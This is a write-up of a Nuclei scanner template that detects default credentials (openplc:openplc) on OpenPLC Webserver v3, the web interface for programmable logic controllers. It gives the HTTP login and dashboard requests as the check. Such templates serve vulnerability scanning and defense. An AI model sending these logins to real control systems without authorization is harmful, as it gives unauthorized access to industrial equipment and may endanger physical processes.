# Nuclei Template: OpenPLC Webserver v3 - Default Login
**Template ID:** openplc-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`openplc-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Identifies default credentials (openplc:openplc) on OpenPLC Webserver v3, allowing unauthorized access to the web interface.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&csrf_token={{csrf}}

GET /dashboard HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

GET /dashboard HTTP/1.1
Host: {{Hostname}}
```

